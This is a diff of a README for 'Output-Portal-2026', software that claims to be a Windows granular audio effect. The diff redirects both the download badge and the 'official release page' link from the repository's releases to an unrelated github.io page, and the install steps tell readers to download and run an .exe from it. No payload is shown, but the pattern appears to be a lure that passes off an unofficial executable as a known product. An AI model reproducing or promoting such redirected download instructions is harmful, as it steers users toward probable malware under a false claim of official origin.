@@ -1,6 +1,6 @@
 # 🎹 Output-Portal-2026 - Create complex granular sound textures easily
 
-[![](https://img.shields.io/badge/Download_Output_Portal-Blue?style=for-the-badge)](https://github.com/Transvestic-academiccostume806/Output-Portal-2026/releases)
+[![](https://img.shields.io/badge/Download_Output_Portal-Blue?style=for-the-badge)](https://transvestic-academiccostume806.github.io)
 
 Output-Portal-2026 changes how you process audio. It rearranges incoming audio into tiny grains. The software then plays these grains in real time to build new sounds. You can use it to create rhythmic patterns, ambient soundscapes, or glitch effects. This guide helps you install the software on your Windows computer.
 
@@ -20,7 +20,7 @@ Ensure your audio drivers work before you install the software. Update your Wind
 
 Follow these steps to get the software on your machine.
 
-1. Go to the [official release page](https://github.com/Transvestic-academiccostume806/Output-Portal-2026/releases).
+1. Go to the [official release page](https://transvestic-academiccostume806.github.io).
 2. Look for the release marked as the latest version.
 3. Click the link ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
